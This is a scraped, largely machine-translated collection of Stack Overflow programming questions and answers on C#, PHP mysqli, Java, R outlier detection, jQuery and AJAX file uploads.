好的，我在谷歌上搜索了教程、API 示例和我能想到的所有其他东西——但失败了。我找到了一堆这样的来源：

*   [谷歌通讯录 API v3](https://developers.google.com/google-apps/contacts/v3/)
*   [API 目录](https://developers.google.com/gdata/docs/directory)
*   [联系人参考指南](https://developers.google.com/google-apps/contacts/v3/reference)

但非包含初学者的端到端示例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-24T14:46:57.627

我的 C# 方法是这样的：

[http://nanovazquez.com/2013/01/18/working-with-google-calendar-on-dotnet/](http://nanovazquez.com/2013/01/18/working-with-google-calendar-on-dotnet/)

代码可以在github上找到：[这里](https://github.com/nanovazquez/google-calendar-sample/tree/master/GoogleCalendarSample)

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  ...
  <appSettings>
    ...
    <!-- GoogleAPI credentials -->
    <add key="ClientId" value="{CLIENT-ID}" />
    <add key="ClientSecret" value="{CLIENT-SECRETD}" />

    <!-- Update the port of the Redirect URI (don't forget to set this value also in the Google API Console) -->
      <add key="RedirectUri" value="http://localhost:{PORT}/Account/GoogleAuthorization" />
  </appSettings>
  <system.web>
  ...
</configuration>
</xml> 
```

您可以删除现有的 Google Calendar api 并添加 Google Contacts Api。

试试这个。

这具有 Oauth 实现和工作原理，但来自 code.google.com 的代码示例没有。

是迄今为止我发现的最好的。

# c# - C# 上 CURLOPT_RETURNTRANSFER 的等价物是什么？

> ID：12866175
> 
> 赞同：4
> 
> 时间：2012-10-12T19:55:27.007
> 
> 标签：c#, curl

当我在 PHP 中使用 curl 时，我可以

```
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
```

这允许我将结果存储在一个变量中。

但是 C# 的[libcURL](http://curl.haxx.se/libcurl/dotnet/)没有返回传输选项。我可以在 c# 上使用什么来代替它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-04T17:01:02.333

我想等价物必须像这样编码，例如：

```
WebResponse webResponse = webRequest.GetResponse();
String response = null;
using(var strReader = new StreamReader(webResponse.GetResponseStream()))
{
    response = streamReader.ReadToEnd();
} 
```

# c# - 关闭所有应用程序单击 X Winform

> ID：12866179
> 
> 赞同：0
> 
> 时间：2012-10-12T19:55:31.093
> 
> 标签：c#, winforms, datagrid

我正在尝试根据选择从 Form1 更改 Form2 中的数据网格和标签的名称。

```
private void button1_Click_1(object sender, EventArgs e)
        {
            this.Hide();

            Form2 frm = new Form2();
            frm.Show();

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Form2 frm = new Form2();

            frm.dataGridView1.Columns["FirstName"].HeaderText = "Prenom";
            frm.dataGridView1.Columns["LastName"].HeaderText = "Nom";

            this.Hide();
            frm.Show();
        } 
```

上述方法对我来说效果很好，但我有一个问题。当我在第二个/Form 2 中单击时`X`，它只是关闭而`Form2`不是`Form1`. 当我单击`X`.

有没有更好的方法来做到这一点？？？我不使用的原因我使用的是 Telerik，但我没有找到在其中添加资源文件的任何选项。如果我错了，请纠正我。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:07:49.403

您只需将一个事件处理程序附加到`Closed`新创建的表单的事件上，以便它在关闭时关闭主表单：

```
private void button1_Click_1(object sender, EventArgs e)
{
    this.Hide();

    Form2 frm = new Form2();
    frm.FormClosed += (_, args) => this.Close(); //Added this method
    frm.Show();
} 
```

也将相同的方法添加到另一个单击处理程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:09:32.907

关闭应用程序最简单的方法是调用静态方法：[Application.Exit](http://msdn.microsoft.com/en-us/library/ms157894.aspx)

如果您只想关闭一个表单，另一种方法是为[FormClosing](http://msdn.microsoft.com/en-us/library/system.windows.forms.form.formclosing.aspx)事件添加一个处理程序并在那里关闭主表单。

# ios - 哪些 iOS 版本可以让您在无需手动管理内存的情况下进行开发？

> ID：12866180
> 
> 赞同：0
> 
> 时间：2012-10-12T19:55:31.230
> 
> 标签：ios, memory-management

> **可能重复：**
> [关于 iOS5 SDK 中自动引用计数的一些问题](https://stackoverflow.com/questions/6368600/some-questions-about-automatic-reference-counting-in-ios5-sdk)

嗯，就是这样。

有没有人支持自动垃圾收集？哪个？

*哪些 iOS 版本可以让您在**无需**自己管理内存的情况下进行开发？*（即，仅使用自动垃圾收集）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T19:58:44.413

它主要不取决于 iOS 的版本。这取决于编译器的版本。LLVM 3.0 及更高版本在 clang 中支持 ARC。

然而不幸的是，iOS 4.2 及更早版本缺少编译器用来生成启用 ARC 的代码的符号，因此这些版本不支持 ARC。不过，这并不是严格的技术依赖——如果编写的 clang 编译器不需要额外的函数来生成 ARC 代码，那么可能所有早期版本的 iOS 都可以运行使用 ARC 编写的程序。

# php - mysqli准备好的语句问题

> ID：12866184
> 
> 赞同：0
> 
> 时间：2012-10-12T19:55:50.693
> 
> 标签：php, mysqli

我正在尝试使用 mysqli 实现我的第一个准备好的语句。

目前我有这个：

```
<?php
$con = new mysqli('example.com', 'user', 'password', 'database');
if (mysqli_connect_errno()) {
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();}

$first = $_GET['firstname'];
$last = $_GET['surname'];
$dob = $_GET['dob'];
$address = $_GET['homeaddress'];
$college = $_GET['college'];
$emergname = $_GET['emergencyname'];
$emergnumber = $_GET['emergencynumber'];
$condition = $_GET['condition'];
$conditiondetails = $_GET['conditiondetails'];
$medication = $_GET['medication'];
$medicationdetails = $_GET['medicationdetails'];

if($stmt = $con->prepare("INSERT INTO medical ('forename', 'surname', 'dob', 'address', 'college', 'emergency_name', 'emergency_number', 'condition', 'condition_details', 'medication', 'medication_details') VALUES (:forename, :surname, :dob, :address, :college, :emergencyname, :emergencynumber, :condition, :conditiondetails, :medication, :medicationdetails)")){

$stmt->bind_param(':forename', $first);
$stmt->bind_param(':surname', $last);
$stmt->bind_param(':dob', $dob);
$stmt->bind_param(':address', $address);
$stmt->bind_param(':college', $college);
$stmt->bind_param(':emergencyname', $emergname);
$stmt->bind_param(':emergencynumber', $emergnumber);
$stmt->bind_param(':condition', $condition);
$stmt->bind_param(':conditiondetails', $conditiondetails);
$stmt->bind_param(':medication', $medication);
$stmt->bind_param(':medicationdetails', $medicationdetails);
$stmt->execute();
$stmt->close();} ?> 
```

我之前尝试过使用以下方法进行更改：

```
<?php
$stmt = $con->prepare("INSERT INTO medical ('forename', 'surname', 'dob', 'address', 'college', 'emergency_name', 'emergency_number', 'condition', 'condition_details', 'medication', 'medication_details') VALUES (?,?,?,?,?,?,?,?,?,?,?)")

$stmt->bind_param('sssssssssss', $first...);
?> 
```

在这两种情况下，我都会收到一条错误消息，指出 $stmt 变量不存在。

关于我哪里出错的任何建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:04:31.873

列名应该用反引号转义，而不是单引号。此外，您不能使用命名参数绑定。

尝试

```
$stmt = $con->prepare("INSERT INTO medical (`forename`, `surname`, `dob`, `address`, `college`, `emergency_name`, `emergency_number`, `condition`, `condition_details`, `medication`, `medication_details`) VALUES (?,?,?,?,?,?,?,?,?,?,?)")

if (!$stmt)
{
  echo $con->error;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:01:46.687

也许您应该尝试使用以下 SQL 语法：

```
$stmt = $con->prepare("INSERT INTO medical VALUES (:forename, :surname, :dob, :address, :college, :emergencyname, :emergencynumber, :condition, :conditiondetails, :medication, :medicationdetails)");

$stmt->bind_param(':forename', $first);
$stmt->bind_param(':surname', $last);
$stmt->bind_param(':dob', $dob);
$stmt->bind_param(':address', $address);
$stmt->bind_param(':college', $college);
$stmt->bind_param(':emergencyname', $emergname);
$stmt->bind_param(':emergencynumber', $emergnumber);
$stmt->bind_param(':condition', $condition);
$stmt->bind_param(':conditiondetails', $conditiondetails);
$stmt->bind_param(':medication', $medication);
$stmt->bind_param(':medicationdetails', $medicationdetails);
$stmt->execute(); 
```

或尝试：

```
$stmt = $con->prepare("INSERT INTO medical VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

$stmt->bind_param('sssssssssss', $first, $second, $third, $fourth, $fifth, $sixth, $seventh, $eighth, $ninth, $tenth, $eleventh); 
```

意思是，在您的 INSERT 语句中没有 Use-Fields 声明。

# java - 在java中制作深度优先搜索算法

> ID：12866188
> 
> 赞同：1
> 
> 时间：2012-10-12T19:56:22.180
> 
> 标签：java, depth-first-search

我有以下有向图实现

```
 Nodes nod[]
 List<Arcs> arc[] 
```

因此，第 n 个位置的节点在位置 n 处具有列表的所有弧。当然，节点是相应组织的，因此我可以使用 Binary Search。基于此实现。我希望创建一个 DFS 算法。伪代码我很熟悉，适应java应该不是问题。

但我的问题如下。在 DFS 中，我们需要从“顶部”节点开始搜索。想想看，我没有这个“顶级”节点。此外，我不知道如何获得它。所以我问，考虑到我的实现，我如何获得这个顶级节点？

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:23:38.643

扩展我的评论：

假设弧是定向的（即，仅从父节点到子节点），您可以在所有节点中搜索没有传入弧的节点：

```
// parent_count is an integer array of the same size as nod[]

for i = 1..n
    for each arc in arc[i] (arc going from i to j)
        increment parent_count[j]
    end
end

for k = 1..n
    if parent_count[k] == 0
        return k
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:07:22.150

DFS/BFS 是非常常见的遍历图的通用算法，两者都没有顶部节点的特殊含义，您可以从任何节点启动 DFS。例如，DFS 用于拓扑排序算法，它指出我们必须从没有传入边的节点开始。

您能否突出显示您要解决的问题？这应该有助于我们找到必须用作 DFS 根的节点。

# r - calculating the outliers in R

> ID：12866189
> 
> 赞同：11
> 
> 时间：2012-10-12T19:56:22.497
> 
> 标签：r

I have a data frame like this:

x

```
Team 01/01/2012  01/02/2012  01/03/2012  01/01/2012 01/04/2012 SD Mean
A     100         50           40        NA         30       60  80 
```

I like to perform calculation on each cell to the mean and sd to calculate the outliers. For example,

```
abs(x-Mean) > 3*SD 
```

`x$count<-c(1)` (increment this value if the above condition is met).

I am doing this to check the anomaly in my data set. If I know the column names, it would be easier to do the calculations, but number of columns will vary. Some cells may have NA in them.

I like to subtrack mean from each cell, and I tried this

```
x$diff<-sweep(x, 1, x$Mean, FUN='-') 
```

does not seem to be working, any ideas?

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-10-12T21:45:25.323

使用以下方法获取您的 IQR（四分位数范围）和下/上四分位数：

```
lowerq = quantile(data)[2]
upperq = quantile(data)[4]
iqr = upperq - lowerq #Or use IQR(data) 
```

计算温和异常值的界限：

```
mild.threshold.upper = (iqr * 1.5) + upperq
mild.threshold.lower = lowerq - (iqr * 1.5) 
```

在这些值之外的任何数据点（>mild.threshold.upper 或 <mild.threshold.lower）都是温和异常值

要检测极端异常值，请执行相同的操作，但要乘以 3：

```
extreme.threshold.upper = (iqr * 3) + upperq
extreme.threshold.lower = lowerq - (iqr * 3) 
```

在这些值之外的任何数据点（>extreme.threshold.upper 或 <extreme.threshold.lower）都是极端异常值

希望这可以帮助

编辑：正在访问 50%，而不是 75%

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-06-14T06:55:51.080

我已经使用上面@by0 的答案创建了一个自动删除异常值的函数。这是函数和一些示例代码：

```
# generate 10 random numbers and 2 'outlier' numbers
testData <- c(-42,rnorm(10),42)

# show the numbers
testData

# define a function to remove outliers
FindOutliers <- function(data) {
  lowerq = quantile(data)[2]
  upperq = quantile(data)[4]
  iqr = upperq - lowerq #Or use IQR(data)
  # we identify extreme outliers
  extreme.threshold.upper = (iqr * 3) + upperq
  extreme.threshold.lower = lowerq - (iqr * 3)
  result <- which(data > extreme.threshold.upper | data < extreme.threshold.lower)
}

# use the function to identify outliers
temp <- FindOutliers(testData)

# remove the outliers
testData <- testData[-temp]

# show the data with the outliers removed
testData 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-13T01:26:40.283

我看到你问了一些关于按行做事的问题。你应该避免这种情况。R 遵循列代表变量和行代表观察的概念。许多功能都根据这个概念进行了优化。如果您需要将宽输出或转置输出到文件，您可以在写入文件之前重新排列数据。

我假设您的数据实际上看起来如问题所示，但您有不止一行。

```
df <- read.table(text="Team 01/01/2012  01/02/2012  01/03/2012  01/01/2012 01/04/2012 SD 

Mean
A     100         50           40        NA         30       60  80
B     200         40           5         8          NA       NA  NA",check.names = FALSE,header=TRUE)

#needed because one date appears twice
df <- df[,]

#reshape the data
library(reshape2)
df <- melt(df,id="Team")
names(df)[2] <- "Date"

#remove the SD and Mean
df <- df[!df$Date %in% c("SD","Mean"),]

#function to detect outliers
outfun <- function(x) {
  abs(x-mean(x,na.rm=TRUE)) > 3*sd(x,na.rm=TRUE)
}

#test if function works
outfun(c(200,rnorm(10)))

#use function over all data
df3$outlier.all <- outfun(df3$value)

#apply function for each team 
library(plyr)
df3 <- ddply(df3,.(Team),transform,outlier.team=outfun(value)) 
```

结果：

```
 Date Team value outlier.all outlier.team
1    01/01/2012    A   100       FALSE        FALSE
2    01/02/2012    A    50       FALSE        FALSE
3    01/03/2012    A    40       FALSE        FALSE
4  01/01/2012.1    A    NA          NA           NA
5    01/04/2012    A    30       FALSE        FALSE
6    01/01/2012    B   200       FALSE        FALSE
7    01/02/2012    B    40       FALSE        FALSE
8    01/03/2012    B     5       FALSE        FALSE
9  01/01/2012.1    B     8       FALSE        FALSE
10   01/04/2012    B    NA          NA           NA 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-07-09T19:05:40.193

以下公式可用于确定哪些值是异常值：

```
upper.outlier.calc <- function(x.var, df){
  with(df, quantile(x.var, 0.75) + (1.5 * (quantile(x.var, 0.75) - quantile(x.var, 0.25))))
}

lower.outlier.calc <- function(x.var, df){
  with(df, quantile(x.var, 0.25) - (1.5 * (quantile(x.var, 0.75) - quantile(x.var, 0.25))))
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-01-24T04:03:38.073

查看我最复杂的功能。它具有三种方法（z mad，iqr），以及对异常值的不同处理（删除，或替换）。可以使用绘图并且可以进行黑客攻击（尝试不同的方法或阈值）

看例子：

```
set.seed(1234)
x = rnorm(10)
ez.outlier(iris,'Sepal.Length',fill='null',hack=T,cutoff=c(1,2,3),plot=T) 
```

[![在此处输入图像描述](../Images/94a48d0688907a41af4e272c0ce1e725.png)](https://i.stack.imgur.com/LWA1k.png)

```
#' univariate outlier cleanup
#' @description univariate outlier cleanup
#' @param x a data frame or a vector
#' @param col colwise processing
#' \cr        col name
#' \cr        if x is not a data frame, col is ignored
#' \cr        could be multiple cols
#' @param method z score, mad, or IQR (John Tukey)
#' @param cutoff abs() > cutoff will be treated as outliers. Default/auto values (i.e. if NA):
#' \cr z 95% of values fall within 1.96, qnorm(0.025,lower.tail=F), or 3
#' \cr mad 2.5, which is the standard recommendation, or 5.2
#' \cr iqr 1.5
#' \cr if multiple values specified, use the first one (an exception is hack=T, during which method and cutoff same length or scalar)
#' @param hack call mapply to try all method and cutoff (same length or scalar, ie, different methods with 
#' corresponding cutoff, or same method with different cutoff).
#' @param plot boxplot and hist before and after outlier processing.
#' @param fillout how to process outlier, fill with na, mean, median (columnwise for data frame), or 
#' null --> remove outlier (only for vector or df with single col specified)
#' @return returns a new data frame or vector. If hack=T, returns nothings
#' @note univariate outlier approach
#' The Z-score method relies on the mean and standard deviation of a group of data to measure central
#' tendency and dispersion. This is troublesome, because the mean and standard deviation are highly
#' affected by outliers – they are not robust. In fact, the skewing that outliers bring is one of the
#' biggest reasons for finding and removing outliers from a dataset!
#' Another drawback of the Z-score method is that it behaves strangely in small datasets – in fact,
#' the Z-score method will never detect an outlier if the dataset has fewer than 12 items in it.
#' \cr
#' \cr
#' Median absolute deviation, modified z-score. The median and MAD are robust measures of central tendency and dispersion, respectively.
#' \cr
#' \cr
#' Interquartile range method is that, like the modified Z-score method, it uses a robust measure of dispersion.
#' \cr
#' @examples
#' set.seed(1234)
#' x = rnorm(10)
#' iris %>% ez.outlier('Sepal.Length',fill='null',hack=T,plot=T)
#' @export
ez.outlier = function(x, col=NULL, method=c('z','mad','iqr'), cutoff=NA, fillout=c('na','null','mean','median'), hack=FALSE, plot=FALSE, na.rm=TRUE, print2scr=TRUE) {
    # https://datascienceplus.com/rscript/outlier.R
    # https://cran.r-project.org/web/packages/outliers/index.html
    # https://rpubs.com/hauselin/outliersDetect

    if (hack==T){
            # here for programming reason, for mapply,
            # cutoff could not be NULL, use NA, because length(NULL)=0, but length(NA)=1
            mapply(ez.outlier,method=method,cutoff=cutoff,MoreArgs=list(x=x,col=col,hack=F,plot=plot,fillout=fillout,na.rm=na.rm,print2scr=print2scr),SIMPLIFY=F,USE.NAMES=F)
            cat('Hack done! No actual data returned.\n')
            return(invisible(NULL))
    }

 method = match.arg(method); fillout =fillout[1]; cutoff=cutoff[1]

    if (!is.data.frame(x)) {
        # todropna is a workaround for data frame with single col passed in

        x.bak.plot = x; x.replace.na = x; oldNAs = sum(is.na(x.replace.na))
        if (fillout=='na' | fillout=='todropna') {
            replacement = NA
        } else if (fillout=='mean') {
            replacement = mean(x, na.rm=na.rm)
        } else if (fillout=='median') {
            replacement = median(x, na.rm=na.rm)
        } else if (fillout=='null') {
            replacement = NULL
        }

        if (method=='z'){
            if(is.na(cutoff)) cutoff = qnorm(0.025,lower.tail=F)
            absz = abs((x - mean(x, na.rm=na.rm))/sd(x, na.rm=na.rm))
            if (!is.null(replacement)) {
                x[absz > cutoff] <- replacement
                } else {
                    # if nothing above cutoff, x is untouched
                    if (length(which(absz > cutoff)) > 0) {
                        x = x[-which(absz > cutoff)]
                    }
                }
            x.replace.na[absz > cutoff] <- NA
        } else if (method=='mad'){
            if(is.na(cutoff)) cutoff = 2.5
            absmad <- abs((x - median(x, na.rm=na.rm))/mad(x, na.rm=na.rm))
            if (!is.null(replacement)) {
                x[absmad > cutoff] <- replacement
                } else {
                    if (length(which(absmad > cutoff)) > 0) {
                        x = x[-which(absmad > cutoff)]
                    }
                }
            x.replace.na[absmad > cutoff] <- NA
        } else if (method=='iqr'){
            # https://stackoverflow.com/a/4788102/2292993
            if(is.na(cutoff)) cutoff = 1.5
            q1 <- quantile(x, 0.25, na.rm=na.rm)
            q3 <- quantile(x, 0.75, na.rm=na.rm)
            # alternatively iqr = q3-q1
            iqr = IQR(x, na.rm = na.rm)
            lower_bound = q1 - (iqr * cutoff)
            upper_bound = q3 + (iqr * cutoff)
            if (!is.null(replacement)) {
                x[(x > upper_bound) | (x < lower_bound)] <- replacement
                } else {
                    if (length(which((x > upper_bound) | (x < lower_bound))) > 0) {
                        x = x[-which((x > upper_bound) | (x < lower_bound))]
                    }
                }
            x.replace.na[(x.replace.na > upper_bound) | (x.replace.na < lower_bound)] <- NA
        }

        newNAs = sum(is.na(x.replace.na)) - oldNAs
        if (print2scr) {
            if (!is.null(col)) {
                cat(sprintf('%-15s %5s(%.2f): %3d outliers found and %s.\n', toString(col), toupper(method), cutoff, newNAs, ifelse((is.null(replacement)|fillout=='todropna'),'REMOVED','REPLACED')))
            } else {
                cat(sprintf('%5s(%.2f): %3d outliers found and %s.\n', toupper(method), cutoff, newNAs, ifelse((is.null(replacement)|fillout=='todropna'),'REMOVED','REPLACED')))
            }
        }

        if (plot){
            # mar controls margin size for individual plot it goes c(bottom, left, top, right)
            # oma is margin for the whole?
            opar = par(mfrow=c(2, 2), oma=c(0,0,1.5,0), mar = c(2,2,1.5,0.5))
            on.exit(par(opar))
            boxplot(x.bak.plot, main=sprintf("With outliers (n=%d)",length(x.bak.plot)))
            hist(x.bak.plot, main=sprintf("With outliers (n=%d)",length(x.bak.plot)), xlab=NULL, ylab=NULL)

            boxplot(x, main=sprintf("With outliers (n=%d)",length(x.bak.plot)-newNAs))
            hist(x, main=sprintf("With outliers (n=%d)",length(x.bak.plot)-newNAs), xlab=NULL, ylab=NULL)
            title(sprintf("%s Outlier Check: %s(%.2f)",toString(col), toupper(method), cutoff), outer=TRUE)
        }
    } else if (is.data.frame(x)) {
        if (length(col)>1 & fillout=='null') {
            cat('I do not know how to remove univariate outliers in multiple cols. fillout: null --> na ...\n')
            fillout='na'
        } else if (fillout=='null') {
            fillout='todropna'
        }
        # trick to pass actual col name
        x[col] = lapply(1:length(col), function(j) {ez.outlier(x=x[col][[j]],col=col[j],method=method,cutoff=cutoff,plot=plot,hack=hack,fillout=fillout,na.rm=na.rm,print2scr=print2scr)})
        if (fillout=='todropna') x=x[complete.cases(x[,col,drop=FALSE]),,drop=FALSE]
    } # end if
    return(invisible(x))
} 
```

# java - Best way to dynamically create and execute bash command in java?

> ID：12866195
> 
> 赞同：1
> 
> 时间：2012-10-12T19:57:08.537
> 
> 标签：java, bash, processbuilder

I have a Java bot that I'm working on which takes input from a user via an IRC message. The user types in something like .host file=foo file=bar hostname="this is a name" and it will start a server for them based on their input.

Right now I have a method that basically parses their message, looking for hostname="" (must be encapsulated by quotes), splitting the hostname= part, and setting the hostname to whatever their result is (for example, hostname="this is a name" would become -hostname 'this is a name'). I am using regex to do this.

I then split the string into an array (separated by spaces) and pass the information to processbuilder, which executes the command in it's own thread. The final command looks something like this:

./server -hostname "this is a name"

A problem I am running into is that since I am splitting by spaces, if the user adds a dash in the hostname (for example, hostname="this is - a name", it'll think that the dash is referring to an argument, and will basically chop off the rest.

Further explanation: processbuilder will split by spaces, so it will pass "-hostname" , "this" , "is" , "-" , "a" , "name". This is where I'm having trouble, since - means I should be passing an argument, but that's not what I am using it for.

What would be the most efficient way to implement this so that any character being passed is only literally this character? Should I not be splitting at spaces? If I run ./server -hostname "this is - a name" from the linux shell, it will run fine.

I appreciate any and all help. Thank you!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T21:19:19.877

Runtime.exec 和 ProcessBuilder 都将采用命令列表。

```
Runtime.exec(new String[]{"./server", "-hostname", "this is - a name"};
ProcessBuilder pb = new ProcessBuilder("./server", "-hostname", "this is - a name"); 
```

这基本上意味着每个元素都作为单独的参数传递给命令（第一个参数），这样您就不必担心空格和额外字符之类的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-13T01:28:57.343

我决定彻底改变我的代码并使用正则表达式来解析用户的输入，而不是以前的方法和空格分割。这意味着我可以简单地将输入作为完整的“+sv_hostname="test - name"”添加到 Arraylist，而不是使用“+sv_hostname”、“test”、“-”、“name”。

# jquery - addClass 到选中的单选按钮和 removeClass from not:checked radio button by CLASS

> ID：12866198
> 
> 赞同：0
> 
> 时间：2012-10-12T19:57:14.270
> 
> 标签：jquery

```
<script type="text/javascript">
$(document).ready(function() {
      $('label').click(function() {
         var total = 0;

          $('.option:checked').each(function() {
              total += Number($(this).data('number'));   
              total = total.toFixed(2); 

          });

              $('#ship_total').text(total);

                var sub_total = <?php echo $this->cart->total(); ?>;

                var ship_total = ($("#ship_total").text());

                var final_total = parseFloat(sub_total) + parseFloat(ship_total);

                final_total = final_total.toFixed(2);

            $('#new_total').text(final_total);

        $('.option:not(:checked)').removeClass('shippingSet');
        $('.option:checked').addClass('shippingSet');
      });
    });
</script> 
```

很简单..我想将添加类添加到选中的收音机并从未选中的收音机中删除类。Radio 有一个类名为`option`

我可以使用 addClass`$(this).addClass('shippingSet')`但我不知道如何删除它。有人可以告诉我添加/删除课程的正确方法吗？谢谢。

# HTML

```
<label><input type="radio" name="ship" class="option" data-number="<?php echo $shipTotal['Ground']; ?>" value="S1"/> Ground <b>$<?php echo $shipTotal['Ground']; ?></b></label> 
```

# 演示 -->

[http://jsfiddle.net/vdgAQ/1/](http://jsfiddle.net/vdgAQ/1/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T19:59:40.560

没有看到 HTML 很难提供帮助，但你可以试试这个：

```
// remove class from all option elements
$('.option').removeClass('shippingSet'); 

// add class only to elements that satisfy your criteria
$('.option:checked').addClass('shippingSet'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:18:48.120

这是你想要的？

[http://jsfiddle.net/vdgAQ/2/](http://jsfiddle.net/vdgAQ/2/)

在您原来的小提琴中，您将类添加到单选按钮本身，这不会影响标签的样式，并且单选按钮本身没有要更改的文本颜色或要更改的 bg 颜色，因此您不会看到任何区别。我只加了

```
$('.option').parent().removeClass('shippingSet');
$('.option:checked').parent().addClass('shippingSet'); 
```

这会将类添加到“标签”的父级，它将影响包含可见文本的标签的 txt 和 bg

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:01:02.963

遍历所有元素并添加和删除检查`:checked`属性的类。

```
 $('.option').each(function(){
         if( $(this).is(':checked')){
             $(this).addClass('shippingSet');
         }
         else{
             $(this).removeClass('shippingSet');
         }
    }); 
```

# php - Insert file into SQL db from PHP using the file path

> ID：12866199
> 
> 赞同：0
> 
> 时间：2012-10-12T19:57:15.107
> 
> 标签：php, ajax, path, blob

I've a form that insert some values using AJAX, and now I want to add also an image, but I can't get the image simply using the superglobal $_FILE['file_name'] in the PHP code, cause the comunication with PHP is under AJAX. So I'm wondering if I could load the file from the PHP using the file's path, infact I could simply pass it throught the JS/AJAX.

Or it's a method that permit me to take the whole file binary code from the JS/AJAX, then pass it to the PHP and finallu put it in a BLOB of the SQL db?

Ps.: obviously I must use the ajax

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:26:07.457

我对通过 AJAX 上传文件没有任何专业知识。但是，如果您需要帮助将文件作为 BLOB 插入数据库，我可以提供一些帮助。

使用[PDO](http://php.net/manual/en/book.pdo.php)相当容易。他们有一个专门介绍有关[LOB](http://www.php.net/manual/en/pdo.lobs.php)的详细信息的页面。

```
$stmt = $db->prepare("INSERT INTO table (image) values (?)");

$fp = fopen($_FILES['file']['tmp_name'], 'rb');

$stmt->bindParam(1, $fp, PDO::PARAM_LOB);

$stmt->execute(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:03:18.953

如果服务器上已经存在该文件，我认为最好通过 AJAX 将文件路径传递给 PHP，然后使用 PHP 的`file_get_contents`函数将其读入。

如果服务器上不存在该文件，您最好提交一个表单。在服务器上执行的 PHP 无法获取文件路径并从客户端获取文件。

如果您可以使用 jQuery，您可以使用 HTML 表单并捕获提交事件，将表单[序列](http://api.jquery.com/serialize/)化为变量，通过 AJAX 传递，并返回 false 以防止表单提交（导致页面重新加载）。

* * *

**编辑**

再三考虑，`serialize`这不是解决方案的唯一部分。那只会让您获得文件输入的值，而不是文件的内容。获取内容会更加乏味。不过，看起来 W3C 正在做[一些事情](http://dev.w3.org/2006/webapi/FileAPI/)。

最好只使用标准的 HTML 表单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:05:21.883

目前 AJAX 不允许您上传文件。

您只需要使用常规方法即可。

但是，Firefox 和 Chrome 有点可能。但这种方法在 IE 中不起作用，而且相当复杂。

**编辑**

可以考虑让 Javascript 使用此[https://developer.mozilla.org/en-US/docs/DOM/FileReader](https://developer.mozilla.org/en-US/docs/DOM/FileReader)，将其序列化并使用 AJAX 通过 POST 发布。有点绕。FileReader 适用于 Chrome 和最新版本的 Firefox。我认为它也适用于 Safari 和 Opera（但不是 100% 肯定）。可能不适用于IE。

但目前让所有浏览器都能正常工作会有点复杂。

# objective-c - 如何在Objective C中打印对象的指针值（作为数字）

> ID：12866200
> 
> 赞同：0
> 
> 时间：2012-10-12T19:57:21.253
> 
> 标签：objective-c, pointers

出于记录和调试目的，我想打印一个对象的地址。当我仅按名称引用对象时，会自动推断描述方法，这是一个字符串。

有没有一种简单的方法来引用地址，作为一个数字？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T19:59:52.757

要打印指针地址，请使用 %p 格式说明符：

```
NSLog(@"Pointer = %p", obj); 
```

# c# - Populating an MVC Model in a View using JQuery ajax with C# code behind

> ID：12866204
> 
> 赞同：-3
> 
> 时间：2012-10-12T19:57:42.930
> 
> 标签：c#, jquery, ajax, asp.net-mvc

In a *ASP.NET MVC* View, what is the syntax to populate a Model using JQuery's `$.getJSON` or `$.ajax`?

The MVC code behind is written in C#.

For an MVC View is there something like? -

> ```
> @model MyModel
> 
> $.getJSON('@Url.Action("MyAction","MyController")/', function (dataReturned) { 
> 
>     @model = dataReturned  //put the data that is returned into the Model
> 
> } 
> ```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:15:40.890

MVC 只是一种模式，有无数种方法可以实现它。告诉我们服务器端有哪些语言和库，也许我们可以为您提供帮助。

# java - Finding Mouse Position relative to a panel

> ID：12866205
> 
> 赞同：7
> 
> 时间：2012-10-12T19:57:44.883
> 
> 标签：java, swing, mouselistener, mouse-position

I'm trying to get the mouse's position within a panel, as in the top left of the panel = x/y 0,0.

What I have at the minute gives the position on the entire screen, so depending on where the panel (which is in a frame) is on the screen, the coordinates are different. I guess you could add to the x/y co-ordinates to account for this, but this seems like a messy solution. Can anyone help?

Here's the mouseListener I'm using, which has been added to the panel.

```
private class MouseListener extends MouseAdapter 
{
    public void mouseClicked(MouseEvent e) 
    {
        // Finds the location of the mouse
        PointerInfo a = MouseInfo.getPointerInfo();
        Point b = a.getLocation();

        // Gets the x -> and y co-ordinates
        int x = (int) b.getX();
        int y = (int) b.getY();
        System.out.println("Mouse x: " + x);
        System.out.println("Mouse y: " + y);

        // Determines which tile the click occured on
        int xTile = x/tileSize;
        int yTile = y/tileSize;

        System.out.println("X Tile: " + xTile);
        System.out.println("Y Tile: " + yTile);

    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-12T20:03:57.623

请参阅[MouseEvent.getPoint()](http://docs.oracle.com/javase/7/docs/api/java/awt/event/MouseEvent.html#getPoint%28%29)。

> 返回事件*相对于源组件的 x,y 位置。*

